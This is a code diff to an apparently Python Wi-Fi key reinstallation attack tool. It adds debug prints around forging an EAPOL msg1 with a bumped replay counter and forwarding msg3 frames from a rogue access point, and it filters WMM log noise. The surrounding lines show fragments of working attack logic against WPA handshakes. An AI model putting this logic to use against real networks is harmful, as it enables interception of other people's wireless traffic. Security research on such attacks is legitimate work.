@@ -295,7 +295,6 @@ class Attack():
             if found_network not in found_networks:
                 found_networks.append(found_network)
                 log(DEBUG, "Found new network: <%s[%s]> at channel %d " % (found_network["ssid"], found_network["bssid"], found_network["channel"]))
-                print(current_chan, found_network["channel"], bssid, found_network["bssid"], ssid, found_network["ssid"])
                 if current_chan is not None and current_chan != found_network["channel"]:
                     return False
                 if bssid is not None and bssid != found_network["bssid"]:
@@ -395,16 +394,22 @@ class Attack():
             client.add_if_new_msg3(p)
             # FIXME: This may cause a timeout on the client side???
             if len(client.msg3s) >= 2:
+                print("stored msg1:", client.msg1.show())
                 log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.",
                     color="green", showtime=False)
                 log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
 
                 # FIXME: Warning if msg1 was not detected. Or generate it ourselves.
                 packet_list = client.msg3s
+                print("msg1 BEFORE: ", client.msg1.show())
                 p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
+                print("msg1 AFTER: ", p.show())
+
                 packet_list.insert(1, p)
 
-                for p in packet_list: self.sock_rogue.send(p)
+                for p in packet_list: 
+                    print(p.show())
+                    self.sock_rogue.send(p)
                 client.msg3s = []
 
                 # TODO: Should extra stuff be done here? Forward msg4 to real AP?
@@ -648,7 +653,11 @@ class Attack():
             log(ERROR, "Rogue hostapd instances unexpectedly closed")
             quit(1)
 
-        if line.startswith(">>>> "):
+        # too many "Rogue hostapd: hostapd_eid_wmm: not including WMM element in beacon or probe response"
+        if "wmm" in line:
+            pass
+
+        elif line.startswith(">>>> "):
             log(STATUS, "Rogue hostapd: " + line[5:].strip())
         elif line.startswith(">>> "):
             log(DEBUG, "Rogue hostapd: " + line[4:].strip())
